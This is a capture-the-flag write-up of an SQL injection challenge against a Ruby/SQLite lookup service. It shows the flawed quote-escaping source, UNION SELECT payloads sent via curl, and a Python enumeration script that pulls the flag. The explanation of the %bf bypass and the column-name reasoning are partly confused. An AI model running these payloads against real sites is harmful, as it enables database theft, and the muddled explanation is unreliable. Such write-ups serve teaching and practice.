# Little Doggy Tables

## Description
It's worse than we thought. We knew the androids couldn't care for the humans like we do (yes, even the cats care--stop yapping about loyalty, Agent Rover). But they don't even remember their own species.
We've found a website that reminds them whether a given robot "agent" is a dog or a cat! And when we confronted a captured android about it, it was arrogant in the extreme:
"Oh, so you found it. Yes, it will tell you if a given agent is a dog or a cat, by looking up the appropriate value in its SQLite database. Good luck with that.
"Sure, the database contains some sensitive information, but our bulletproof firewall and top-notch quote escaping will ensure it never sees the light of day.
"Not secure? Huh? You don’t believe me? I’ll show you how secure. Here’s the source!"
USAGE EXAMPLE:
curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=Fido"
https://little-doggy-tables.capturethesquare.com

### Solution

This was a websec challenge. description suggests this is an SQLite database so it's likely an SQL injection challenge.

We are given the following Ruby source code for reference:

```
#!/usr/bin/env ruby

# author: Will McChesney <wmcc@squareup.com>

require "sqlite3"
require "webrick"

PORT = ARGV[0]

class SecureDatastore
  include Singleton

  def initialize
    @db = SQLite3::Database.new("secure.db")
  end

  def secure_species_lookup(insecure_codename)
    # roll our own escaping to prevent SQL injection attacks
    secure_codename = insecure_codename.gsub("'", Regexp.escape("\\'"))
    query = "SELECT species FROM operatives WHERE codename = '#{secure_codename}';"

    puts query
    results = @db.execute(query)

    return if results.length == 0
    results[0][0]
  end
end

server = WEBrick::HTTPServer.new(Port: PORT)

trap("INT") { server.shutdown }

class AgentLookupServlet < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    response.status = 200
    response["Content-Type"] = "text/plain"

    response.body = SecureDatastore.instance.secure_species_lookup(request.query["codename"]) + "\n"
  end
end

server.mount "/agent_lookup", AgentLookupServlet

server.start
```


The function gets passed an 'insecure_codename' variable which is our unsanitized query input. Then, there's a regex escaping that will add to any single quotes passed, a backslash. i.e. ' would be change to \'.

This is however insufficient as we can add %bf. It's possible to bypass this and we will get a single quote that will not get escaped properly.

Next, we already know this is an SQLite backend DB, and the given query in the source code suggests that there's a table named operatives.  let's confirm this anyway:


```
~# curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select name from sqlite_master; --" --insecure

operatives
```

OK, so operatives it is, let's try to see what other rows we have other in 'species'

```
~# for i in {a..z}; do curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select species from operatives where species LIKE \"${i}%\"; --" --insecure; done

dog
cat

```

So we have a dog and a cat, not interesting in particular.

Let's find what codenames are available, other than Fido. maybe the flag is there?


```
~# for i in {a..z}; do curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select codename from operatives where codename LIKE \"${i}%\"; --" --insecure; done

Bella
Felix
Fido
Missy
Oscar
Rex
Spot
Tigger
```

Flag isn't there. maybe it's time to enumerate what other columns are available, I tried password, users, flags, flag but no cigar.

```
~# curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select secrets from operatives where secrets LIKE \"a%\"; --" --insecure;

no such column: secrets
```

no such thing as secrets, maybe secret?

```
~# curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select secret from operatives where secret LIKE \"a%\"; --" --insecure;

<H1>Internal Server Error</H1>
```
Yes! we get an internal server error message as opposed to 'No such column' so we know secrets exists, let's try the same query except this time with secrets as column.

```
~# curl "https://little-doggy-tables.capturethesquare.com/agent_lookup" --get --data-urlencode "codename=%bf' union select secret from operatives where secret LIKE \"1%\"; --" --insecure;

136571b41aa14adc10c5f3c987d43c02c8f5d498
```

We got an interesting string, but this isn't the flag, so let's enumerate with LIKE and some random numbers:

```
#!/usr/bin/python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = 'https://little-doggy-tables.capturethesquare.com/agent_lookup'


for i in range(10):
  q = '%bf\' union select secret from operatives where secret LIKE "%{0}"; --'.format(i)
  req = requests.get(URL, verify=False, params={'codename':q})
  if 'Error' not in req.text:
    print req.text


~#: python littledoggy.py 
ccf271b7830882da1791852baeca1737fcbe4b90

9c6b057a2b9d96a4067a749ee3b3b0158d390cf1

flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436

136571b41aa14adc10c5f3c987d43c02c8f5d498
```


flag is flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436.
